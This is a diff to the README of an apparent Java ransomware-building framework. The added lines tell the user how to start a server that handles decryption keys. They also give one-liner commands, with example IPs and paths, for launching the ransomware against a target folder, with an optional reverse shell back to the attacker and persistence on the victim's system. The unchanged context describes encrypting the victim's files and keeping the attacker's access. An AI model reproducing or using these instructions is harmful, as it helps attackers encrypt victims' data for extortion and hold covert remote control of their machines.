@@ -10,6 +10,7 @@ It is a project to build a ransomware made with java. With the framwork, ransomw
 
 ## User guideline
 * To run the JRF framework, move to JRF/Classes directory and run `java JRF` in terminal
+* To run MainServer, which handles keys and decryption requests, move to JRF/Classes directory and run `java MainServer` in terminal
 
 ### Parameters:
 * Target path: the path which the ransomware encrypts the files. Make sure it is **set to the right folder**. Leaving blank would mean that the ransomware would encrypt its local directory.
@@ -17,6 +18,14 @@ It is a project to build a ransomware made with java. With the framwork, ransomw
 * Reverse shell: 
     * port: any port except 5555 and 6666, since these are the ports used by KeyServer and DecryptRequestHandler
     * persistence: Decryptor tries to configure the victim system so that the attacker's access would be persistent. This may be detected as some system has permission setting blocking this utility.
+
+### One liner:
+* `java JRF <IP> <TargetPath> <revPort> <persistence> <exportPath>`
+Examples:
+* `java JRF 192.168.68.21 /home /home/user/Desktop`
+* `java JRF 192.168.68.21 /home 5678 /home/user/Desktop`
+* `java JRF 192.168.68.21 /home 5678 persistence /home/user/Desktop`
+Note: reverse shell and persistence are optional
 
 
 ## Features:
